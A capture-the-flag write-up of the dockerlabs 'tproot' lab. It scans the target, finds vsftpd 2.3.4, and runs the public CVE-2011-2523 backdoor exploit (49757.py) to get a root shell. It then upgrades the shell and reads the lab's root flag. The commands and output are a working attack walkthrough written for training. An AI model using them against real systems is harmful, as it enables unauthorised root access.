# tproot

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| tproot | d1se0 | Very Easy | dockerlabs |

**Summary:** The tproot machine presented two services: an Apache web server on port 80 serving nothing more than a default Ubuntu page, and an FTP daemon on port 21 running vsftpd version 2.3.4. The FTP service returned a permission error during anonymous login attempts (OOPS: cannot change directory:/var/ftp), which incidentally confirmed that the daemon was alive and responding before any authentication could proceed. The version string alone was sufficient to identify the target as afflicted by CVE-2011-2523, a backdoor deliberately introduced into the vsftpd 2.3.4 source tarball in 2011 by a malicious actor who compromised the project's distribution server. The backdoor activates when the FTP username field contains the smiley-face sequence `:)`, causing the daemon to bind a command shell on TCP port 6200. Because the vsftpd process ran with root privileges inside the container, the shell it spawned was immediately a root shell. The standalone Python exploit `49757.py` was retrieved from the local Exploit-DB mirror and executed against the target in a single command. No authentication bypass, no password cracking, and no privilege escalation were needed. The session was then stabilised using the `script` utility to promote the raw shell to a fully interactive PTY, and the root flag was read directly from `/root/root.txt`.

---

## Reconnaissance

The container was deployed through the standard dockerlabs script and assigned the IP address `172.17.0.2`.

**1.** Deploy the target and record its address:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/tproot]
└─$ sudo bash auto_deploy.sh tproot.tar

                        ##        .
                  ## ## ##       ==
               ## ## ## ##      ===
           /""""""""""""""""\___/ ===
      ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
           \______ o          __/
             \    \        __/
              \____\______/

  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]



Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2.** Set shell variables and launch a full-port versioned Nmap scan:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tproot]
└─$ ip=172.17.0.2 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tproot]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 18:52 +07
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
```

The scan returned two open ports. **TCP 80** hosted Apache 2.4.58 presenting the default Ubuntu "It works" page, offering no exploitable attack surface. **TCP 21** hosted **vsftpd 2.3.4**, and Nmap's FTP scripting engine had already attempted an anonymous login probe, receiving a `500 OOPS: cannot change directory:/var/ftp` error. While the directory permission misconfiguration prevented anonymous browsing, it was irrelevant: the version string `vsftpd 2.3.4` is one of the most immediately recognisable version numbers in offensive security, pointing directly to CVE-2011-2523.

---

## Vulnerability Research and Exploit Staging

**3.** Query the local Exploit-DB mirror for all known vulnerabilities affecting vsftpd 2.3.4:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tproot]
└─$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                          | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)             | unix/remote/17491.rb
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Two exploit entries were returned: a Metasploit module (`17491.rb`) and a self-contained Python script (`49757.py`). The Python script was preferred to keep the exploitation manual and independent of the Metasploit Framework.

**4.** Copy the exploit to the local working directory and confirm its registration details:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tproot]
└─$ searchsploit -m unix/remote/49757.py
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
    Codes: CVE-2011-2523
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /tmp/tproot/49757.py
```

The exploit is catalogued under **CVE-2011-2523**, is marked as verified by Exploit-DB, and requires only the target host address as input. The backdoor mechanism works by watching the FTP `USER` command: if the username contains the string `:)`, the daemon forks a child process and binds a shell to port 6200, bypassing all authentication.

---

## Exploitation and Root Shell

**5.** Execute the exploit against the target IP:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/tproot]
└─$ python2 49757.py $ip
Success, shell opened
Send `exit` to quit shell
id
uid=0(root) gid=0(root) groups=0(root)
/usr/bin/script -qc /bin/bash /dev/null
root@dockerlabs:/tmp/vsftpd-2.3.4-infected# export SHELL=/bin/bash
export SHELL=/bin/bash
root@dockerlabs:/tmp/vsftpd-2.3.4-infected# export TERM=xterm-256color
export TERM=xterm-256color
root@dockerlabs:/tmp/vsftpd-2.3.4-infected# cd
cd
root@dockerlabs:~# id;whoami;hostname
id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
dockerlabs
```

The exploit reported `Success, shell opened`. The immediately following `id` command confirmed `uid=0(root)`, proving that vsftpd was running as the root user. The working directory of the spawned shell was `/tmp/vsftpd-2.3.4-infected`, which is the staging location used by the infected daemon process.

The raw bind shell was upgraded to a fully interactive PTY by invoking `/usr/bin/script -qc /bin/bash /dev/null`. This technique forks a bash process under a pseudo-terminal, enabling job control and readline editing. The environment variables `SHELL` and `TERM` were then exported to complete the terminal setup. A `cd` without arguments moved to root's home directory, and the chained `id;whoami;hostname` confirmed root privileges on the host named `dockerlabs`.

---

## Post-Exploitation Enumeration and Flag Retrieval

**6.** Enumerate root's home directory and the system's user accounts, then read the root flag:

```bash
root@dockerlabs:~# ls -la
ls -la
total 28
drwx------ 1 root root 4096 Mar 10 11:55 .
drwxr-xr-x 1 root root 4096 Mar 10 11:51 ..
-rw------- 1 root root   47 Mar 10 11:55 .bash_history
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
drwxr-xr-x 3 root root 4096 Feb  2  2025 .local
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
-rw-r--r-- 1 root root   33 Feb  3  2025 root.txt
root@dockerlabs:~# ls -la /home
ls -la /home
total 12
drwxr-xr-x 3 root   root   4096 Nov 19  2024 .
drwxr-xr-x 1 root   root   4096 Mar 10 11:51 ..
drwxr-x--- 2 ubuntu ubuntu 4096 Nov 19  2024 ubuntu
root@dockerlabs:~# ls -la /home/ubuntu
ls -la /home/ubuntu
total 20
drwxr-x--- 2 ubuntu ubuntu 4096 Nov 19  2024 .
drwxr-xr-x 3 root   root   4096 Nov 19  2024 ..
-rw-r--r-- 1 ubuntu ubuntu  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 ubuntu ubuntu  807 Mar 31  2024 .profile
root@dockerlabs:~# cat /root/root.txt
cat /root/root.txt
261fd3f32200f950f231816b4e9a0594
```

Root's home directory contained `root.txt`, the challenge flag. The only other user account on the system was `ubuntu`, whose home directory held nothing beyond standard shell configuration files. The root flag was read directly without obstruction:

```
261fd3f32200f950f231816b4e9a0594
```

---

## Attack Chain Summary

1. **Reconnaissance**: A full TCP port scan identified two open services: Apache 2.4.58 on port 80 serving a default Ubuntu placeholder page, and vsftpd 2.3.4 on port 21. Nmap's anonymous login probe received a `500 OOPS: cannot change directory:/var/ftp` error, confirming the FTP service was alive. The version string immediately flagged the target as vulnerable to the well-known vsftpd backdoor (CVE-2011-2523).

2. **Vulnerability Discovery**: `searchsploit` was used to query the local Exploit-DB mirror, returning two public exploits for CVE-2011-2523. The standalone Python script `49757.py` was selected and mirrored to the working directory with `searchsploit -m`.

3. **Exploitation**: The Python exploit was executed with the target IP as its only argument. It triggered the vsftpd backdoor by injecting the `:)` smiley string into the FTP username field, causing the daemon to bind a shell on TCP port 6200. The exploit connected to that port and presented an interactive command interface.

4. **Internal Enumeration**: Because vsftpd ran as root, the shell landed with `uid=0(root)` immediately. Post-exploitation enumeration of root's home directory revealed `root.txt` containing the challenge flag. The `/home` directory showed a single additional user account (`ubuntu`) with no interesting files or credentials.

5. **Privilege Escalation**: No escalation was required. The vsftpd backdoor spawned a root shell directly. The session was upgraded from a raw bind shell to a fully interactive PTY using `script -qc /bin/bash /dev/null`, with `SHELL` and `TERM` environment variables exported to complete the terminal stabilisation.
